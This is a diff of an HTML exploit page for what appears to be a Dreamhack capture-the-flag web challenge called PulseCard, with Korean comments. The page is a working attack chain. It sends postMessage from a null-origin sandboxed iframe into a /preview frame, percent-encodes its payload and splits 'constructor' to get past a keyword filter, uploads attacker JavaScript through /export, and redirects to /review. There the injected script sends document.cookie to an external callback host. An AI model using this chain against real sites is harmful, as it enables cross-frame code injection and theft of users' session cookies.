@@ -2,70 +2,67 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>PulseCard exploit</title>
+  <title>PulseCard Exploit</title>
 </head>
 <body>
-  <h1>loading...</h1>
+  <h1>PulseCard exploit</h1>
 
-  <iframe id="preview" src="http://localhost:5000/preview" style="display:none"></iframe>
-  <iframe id="sender" sandbox="allow-scripts" style="display:none"></iframe>
+  <iframe id="box" sandbox="allow-scripts" style="display:none"></iframe>
 
   <script>
-  // ngrok 주소가 바뀌면 여기만 바꾸면 됨.
-  const CALLBACK = "https://tunotfw.request.dreamhack.games/hit";
+  const CALLBACK = "https://너의-requestbin-endpoint";
 
-  // 최종적으로 /review에서 실행될 JS
-  const widgetJS = `
-    (new Image()).src = ${JSON.stringify(CALLBACK)} + "?cookie=" + encodeURIComponent(document.cookie);
-  `;
+  new Image().src = CALLBACK + "/loaded?t=" + Date.now();
 
-  // /preview 안에서 실행될 2단계 코드
-  const stage2 = `
-    (async () => {
-      const r = await fetch("/export", {
-        method: "POST",
-        headers: {
-          "X-Card-Token": CARD_TOKEN,
-          "Content-Type": "application/javascript"
-        },
-        body: ${JSON.stringify(widgetJS)}
-      });
+  const widgetJS =
+    `(new Image()).src=${JSON.stringify(CALLBACK)}+"/cookie?c="+encodeURIComponent(document.cookie)+"&t="+Date.now();`;
 
-      const name = await r.text();
-      parent.postMessage({ type: "widget-created", name }, "*");
-    })();
-  `;
+  const stage2 =
+    `(async()=>{try{` +
+    `let r=await fetch('/export',{method:'POST',credentials:'include',headers:{'X-Card-Token':CARD_TOKEN,'Content-Type':'application/javascript'},body:${JSON.stringify(widgetJS)}});` +
+    `let x=await r.text();` +
+    `top.postMessage({t:'stage',s:r.status,x:x},'*');` +
+    `}catch(e){top.postMessage({t:'err',x:String(e)},'*')}})()`;
 
-  // blocked() 필터에 걸리지 않도록 모든 문자를 %xx로 인코딩
-  const pctAll = (s) =>
+  const pctAll = s =>
     Array.from(new TextEncoder().encode(s), b =>
       "%" + b.toString(16).padStart(2, "0")
     ).join("");
 
-  // constructor는 금지어라 "con"+"structor"로 쪼갬
   const formula =
-    'Date["con"+"structor"](decodeURIComponent(' +
-    JSON.stringify(pctAll(stage2)) +
-    '))()';
+    `Date["con"+"structor"](decodeURIComponent(${JSON.stringify(pctAll(stage2))}))()`;
 
-  window.addEventListener("message", (e) => {
+  window.addEventListener("message", e => {
     const d = e.data || {};
 
-    if (d.type === "widget-created" && /^[A-Za-z0-9_-]+\.js$/.test(d.name)) {
-      // flag 쿠키 path가 /review라서 반드시 /review로 이동해야 함
+    new Image().src =
+      CALLBACK +
+      "/msg?d=" +
+      encodeURIComponent(JSON.stringify(d).slice(0, 1500)) +
+      "&t=" +
+      Date.now();
+
+    if (d.t === "stage" && d.s === 200 && /^[A-Za-z0-9_-]+\.js$/.test(d.x)) {
       location.href =
-        "http://localhost:5000/review?widget=" + encodeURIComponent(d.name);
+        "http://localhost:5000/review?widget=" + encodeURIComponent(d.x);
     }
   });
 
-  // /preview는 e.origin === "null"인 postMessage만 받음.
-  // sandbox srcdoc iframe은 origin이 null이므로 조건 통과.
-  document.getElementById("sender").srcdoc = `
-    <script>
-      const payload = ${JSON.stringify(formula)};
-      setInterval(() => parent.frames[0].postMessage(payload, "*"), 300);
-    <\/script>
-  `;
+  const inner = `
+<!doctype html>
+<html>
+<body>
+  <iframe id="p" src="http://localhost:5000/preview"></iframe>
+  <script>
+    const payload = ${JSON.stringify(formula)};
+    setInterval(() => {
+      frames[0].postMessage(payload, "*");
+    }, 300);
+  <\/script>
+</body>
+</html>`;
+
+  document.getElementById("box").srcdoc = inner;
   </script>
 </body>
 </html>
